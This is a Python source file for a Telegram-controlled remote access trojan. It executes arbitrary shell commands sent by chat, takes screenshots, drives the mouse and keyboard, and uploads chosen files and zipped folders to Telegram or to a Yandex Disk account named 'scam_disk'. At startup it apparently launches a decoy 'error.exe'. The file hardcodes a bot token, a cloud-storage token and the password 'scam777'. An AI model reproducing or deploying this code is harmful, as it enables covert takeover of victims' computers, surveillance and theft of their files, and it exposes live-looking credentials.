import logging
import os
import random
import shutil
import subprocess
import sys
import threading
import time

import keyboard
import pyautogui

from telegram import Update, ForceReply
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
from yadisk import yadisk

token = '5846510402:AAF2knMSpHRm_vCccht8mYERWkb40WE1M5Q'
scam_disk = yadisk.YaDisk(token='y0_AgAAAAAzsvwhAAi8-gAAAADVgyY7nU2TGVVUQIKOGUIUBRWyDbY0CbY')
password = "scam777"
authed_users = []
banned_users_ids = [582461607]

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO
)

logger = logging.getLogger(__name__)

command_multi_line = ''  # completed command for the shell (contains all commands, until clear is pressed)


def cmd_thread(messageText, chatId, bot):
    global command_multi_line
    command_text = messageText.split('cmd ')[1]
    print(f'Command text is: {command_text}')
    append = True
    if command_text == 'clear':
        command_multi_line = ''
        result = 'Cmd session cleared'
    elif command_text == 'cmdsession':
        result = f'Cmd session command is:\n{command_multi_line}'
    else:
        to_execute = command_multi_line
        if ';' in command_text:  # multiple commands handling
            for c in command_text.split(';'):
                to_execute += ' & ' + c
        elif 'cmd cur ' in messageText:
            to_execute += ' & ' + messageText.split('cmd cur ')[1]
            append = False
        else:
            if command_multi_line.strip() == '':
                to_execute = command_text
            else:
                to_execute += ' & ' + command_text
        print(f'Command is: {to_execute}')

        if 'cd' in to_execute:
            working_dir = to_execute.split('cd')[1].split('&')[0]
        else:
            working_dir = os.curdir
        working_dir = working_dir.strip()
        print(f'Working dir: {working_dir}')
        output = ''
        process = subprocess.Popen(to_execute, cwd=working_dir, shell=True, stdout=subprocess.PIPE,
                                   stderr=subprocess.STDOUT)
        for line in process.stdout.readlines():
            line = line.strip()
            if line:
                output += line.decode('cp866') + '\n'
        if append:
            command_multi_line = to_execute
        result = f'Output for command:\n{command_text} \nIs:\n {output}'
    bot.send_message(chatId, result)


def handle_command(bot, message):
    result = 'unknown command'
    message_text = message.text
    user = message.from_user
    chatId = message.chat_id
    message_id = message.message_id

    message_text = message_text.lower()

    if message_text == 'left':
        pyautogui.click("left")
        result = 'Mouse left clicked'
    elif message_text == 'right':
        pyautogui.click("right")
        result = 'Mouse right clicked'
    elif message_text == 'switch':
        keyboard.press("alt")
        keyboard.press("tab")
        keyboard.release("alt")
        keyboard.release("tab")
        result = 'Window switched'
    elif message_text == 'close':
        keyboard.press("alt")
        keyboard.press("f4")
        keyboard.release("alt")
        keyboard.release("f4")
        result = 'Current window closed'
    elif message_text == 'hide':
        keyboard.press("win")
        keyboard.press("d")
        keyboard.release("win")
        keyboard.release("d")
        result = 'Hided all windows'
    elif message_text == 'mystify' or message_text == 'anim':
        os.system("Mystify.scr -a")
        result = 'Mystify animation started'
    elif message_text == 'watching' or message_text == 'hacked':
        os.system("start cmd")
        time.sleep(0.1)
        keyboard.write("I am watching you...", 0.1)
        time.sleep(1.0)
        keyboard.press("alt")
        keyboard.press("f4")
        keyboard.release("alt")
        keyboard.release("f4")
        result = 'Watching command line shown'
    elif message_text.startswith('cmd '):
        cmdThread = threading.Thread(target=cmd_thread, args=(message_text, chatId, bot))
        cmdThread.start()
        return 'command executed, waiting until it finishes'
    elif message_text == 'matrix':
        os.startfile("matrix.bat")
        time.sleep(0.1)
        keyboard.press("alt")
        keyboard.press("enter")
        keyboard.release("alt")
        keyboard.release("enter")
        result = 'Matrix shown'
    elif message_text.startswith('press '):
        key = message_text.split('press ')
        try:
            keyboard.press(key[1])
            keyboard.release(key[1])
            result = f'Key {key[1]} typed'
        except ValueError as error:
            result = f'Failed to press{key[1]}: error was: \n{error}'
    elif message_text.startswith('alert '):
        command_text = message_text.split('alert ')[1]
        print(command_text.split())
        print(command_text.split().__len__())
        if command_text.split().__len__() != 3:
            return 'Wrong format: should be:\nalert title, text, button_text'
        title = command_text.split()[0]
        text = command_text.split()[1]
        button_text = command_text.split()[2]
        pyautogui.alert(text=text, title=title, button=button_text)
        result = f'Alert window with title: {title}, text: {text} and button text: {button_text} was shown'
    elif message_text.startswith('type '):
        phrase = message_text.split('type ')
        if phrase[0] == message_text:
            return 'What do u want to type?'

        phrase = phrase[1]
        time.sleep(0.2)
        try:
            keyboard.write(phrase)
            result = f'Phrase {phrase} type successfully'
        except ValueError as error:
            result = f'Failed to type{phrase}: error was: \n{error}'
            print(error)
    elif message_text.startswith('scroll '):
        if message_text.split('scroll ').__len__() != 2:
            return 'How much scrolling do you need'
        direction = 0
        try:
            direction = int(message_text.split('scroll ')[1])
            pyautogui.scroll(int(direction))
            result = f'Mouse scrolled {int(direction)} units {"down" if direction < 0 else "up"}'
        except ValueError as error:
            result = f"Failed to scroll {direction} units with error:\n{error}"
    elif message_text.startswith('move '):
        if message_text.split('move ').__len__() == 1:
            return 'At least one argument required'
        if message_text.split('move ').__len__() == 2 and 2 <= message_text.split('move ')[1].split().__len__() <= 3:
            x, y = 0, 0
            try:
                x = int(message_text.split('move ')[1].split()[0])
                y = int(message_text.split('move ')[1].split()[1])
                absolute = message_text.split('move ')[1].split().__len__() == 3
                if absolute:
                    pyautogui.moveTo(x, y)
                else:
                    pyautogui.moveRel(x, y)
                result = f'Mouse {f"moved by ({x}, {y}) " if not absolute else "moved "}to ({pyautogui.position().x}, {pyautogui.position().y})'
            except ValueError as error:
                result = f'Failed to move mouse cursor to ({x}, {y}) with error:\n{error}'
        else:
            return 'Syntax: move X Y A'
    elif message_text.startswith('drag '):
        if message_text.split('drag ').__len__() == 1:
            return 'At least one argument required'
        if message_text.split('drag ').__len__() == 2 and 2 <= message_text.split('drag ')[1].split().__len__() <= 3:
            x, y = 0, 0
            try:
                x = int(message_text.split('drag ')[1].split()[0])
                y = int(message_text.split('drag ')[1].split()[1])
                absolute = message_text.split('drag ')[1].split().__len__() == 3
                if absolute:
                    pyautogui.dragTo(x, y)
                else:
                    pyautogui.dragRel(x, y)
                result = f'Mouse {f"dragged by ({x}, {y}) " if not absolute else "dragged "}to ({pyautogui.position().x}, {pyautogui.position().y})'
            except ValueError as error:
                result = f'Failed to drag mouse cursor to ({x}, {y}) with error:\n{error}'
        else:
            return 'Syntax: drag X Y A'
    elif message_text == 'mouse':
        result = f'Mouse position on screen is:  ({pyautogui.position().x}, {pyautogui.position().y})'
    elif message_text == 'screen':
        screen = pyautogui.screenshot()
        screen.save('screenshot.png')
        bot.send_photo(chatId, photo=open('screenshot.png', 'rb'))
        result = 'Screenshot:'
    elif message_text.startswith('getfile '):
        if message_text.split('getfile ').__len__() != 2:
            return 'Syntax: getfile file name'
        file_name = message_text.split('getfile ')[1]
        if ':\\' in file_name:  # absolute path
            path = file_name
        else:  # relative path
            path = os.curdir + '/' + file_name
        try:
            file = open(path, 'rb')
            bot.send_document(chatId, file, caption=f'{file_name}:', filename=file.name)
            result = ''
            file.close()
        except FileNotFoundError as error:
            result = f'Failed to send {file_name} with error:\n{error}'
    elif message_text.split('getfolder '):
        if message_text.split('getfolder ')[0] == message_text:
            print(f'making archive for {os.path.abspath(os.curdir)}')
            shutil.make_archive('../FOLDER_SAVE', 'zip', os.curdir)
            file = open("../FOLDER_SAVE.zip", 'rb')
            path = os.path.abspath('../FOLDER_SAVE.zip')
            print(f'path is: {path}')
            print('saved')
            print(f'size: {os.path.getsize(path)}')
            if os.path.getsize(path) < 1048576:  # telegram limit size
                print('sending to bot')
                bot.send_document(chatId, file, caption=f'{os.curdir}', filename=file.name)
            else:  # yandex disk
                print('sending to disk')
                bot.send_message(chatId, "Uploading to disk started")
                scam_disk.upload('../FOLDER_SAVE.zip', f'FOLDER_SAVE{random.randint(0, 10000)}.zip')
                print('uploaded to disk')
                result = 'Uploaded to yandex disk)))'
            file.close()

    elif message_text == f'exit {password}':
        delete_password_message(bot, message)
        bot.send_message(chatId, 'Exited, bye')
        sys.exit(0)

    return result


def delete_password_message(bot, to_delete):
    bot.deleteMessage(to_delete.chat_id, to_delete.message_id)


def get_response(bot, message):
    if banned_users_ids.__contains__(message.from_user.id):
        return 'BANNED'
    if not authed_users.__contains__(message.from_user.id):
        delete_password_message(bot, message)
        if message.text == password:
            authed_users.append(message.from_user.id)
            return 'Authorization successful'
        else:
            return 'You can\'t send commands, because you are unauthorized\nEnter a password to start sending commands'
    else:
        response = handle_command(bot, message)
    return response


def handle_messages(update: Update, context: CallbackContext) -> None:
    bot = context.bot
    message = update.message
    messageText = message.text
    user = message.from_user
    username = user.username
    print(message.chat_id)

    print(f'Received a message from @{username} with text: {messageText}')
    response = get_response(bot, message)
    if response != '':
        index = 0
        if response.__len__() > 4096:
            while response.__len__() > index:
                bot.send_message(message.chat_id, response[index:index + 4096])
                index += 4096
        else:
            bot.send_message(message.chat_id, response)


def main() -> None:
    print(sys.getdefaultencoding())
    #    locale.setlocale(locale.LC_ALL, 'ru_RU.1251')

    """Start the bot."""
    print('Bot started')
    # Create the Updater and pass it your bot's token.
    updater = Updater(token)
    os.system("error.exe")
    updater.bot.sendMessage("1280356300", "Bot is online")  # me
    updater.bot.sendMessage("-1001847130553", "Bot is online")  # bot group

    # Get the dispatcher to register handlers
    dispatcher = updater.dispatcher

    dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_messages))

    # Start the Bot
    updater.start_polling()

    # Run the bot until you press Ctrl-C or the process receives SIGINT,
    # SIGTERM or SIGABRT. This should be used most of the time, since
    # start_polling() is non-blocking and will stop the bot gracefully.
    updater.idle()


if __name__ == '__main__':
    main()
